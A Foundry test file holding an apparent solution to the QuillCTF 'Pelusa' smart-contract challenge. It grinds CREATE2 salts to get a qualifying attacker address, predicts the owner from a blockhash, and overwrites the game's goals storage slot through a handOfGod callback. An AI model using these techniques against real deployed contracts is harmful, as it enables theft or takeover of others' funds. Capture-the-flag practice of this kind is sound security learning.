// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8;

import "forge-std/Test.sol";
import {IGame, Pelusa} from "../../src/QuillCTF/Pelusa/Pelusa.sol";

contract PelusaAttacker is IGame {
    address public owner;
    uint256 goals;

    constructor(address _owner, address pelusa) {
        owner = _owner;
        Pelusa(pelusa).passTheBall();
    }

    function getBallPossesion() external view override returns (address) {
        return owner;
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}

contract PelusaAttackerDeployer {
    address public deployment;
    address immutable target;

    constructor(address _target) {
        target = _target;
    }

    function deployAttacker(address _owner, bytes32 _salt) external {
        address addr = address(new PelusaAttacker{salt: _salt}(_owner, target));
        require(uint256(uint160(addr)) % 100 == 10, "bad address");
        deployment = addr;
    }

    function getAttackerAddress(
        address _owner,
        bytes32 _salt,
        address _pelusa
    ) external view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(PelusaAttacker).creationCode,
            abi.encode(_owner, _pelusa)
        );
        bytes32 _hash = keccak256(
            abi.encodePacked(hex"ff", address(this), _salt, keccak256(bytecode))
        );
        return address(uint160(uint256(_hash)));
    }
}

contract PelusaTest is Test {
    Pelusa public pelusa;
    PelusaAttacker public pelusaAttacker;
    PelusaAttackerDeployer public pelusaAttackerDeployer;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = vm.addr(1);
        attacker = vm.addr(2);

        vm.startPrank(deployer);
        pelusa = new Pelusa();
        pelusaAttackerDeployer = new PelusaAttackerDeployer(address(pelusa));
        vm.stopPrank();

        vm.startPrank(attacker, attacker);
        address owner = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(deployer, blockhash(block.number))
                    )
                )
            )
        );

        bytes32 salt;
        for (uint256 i = 0; i < 100000; i++) {
            salt = bytes32(i);
            address pelusaAttackerConfirm = pelusaAttackerDeployer
                .getAttackerAddress(owner, salt, address(pelusa));
            if (uint256(uint160(pelusaAttackerConfirm)) % 100 == 10) {
                break;
            }
        }
        pelusaAttackerDeployer.deployAttacker(owner, salt);
        vm.stopPrank();
    }

    function testCallShoot() public {
        pelusa.shoot();

        assertTrue(pelusa.goals() == 2);
    }
}
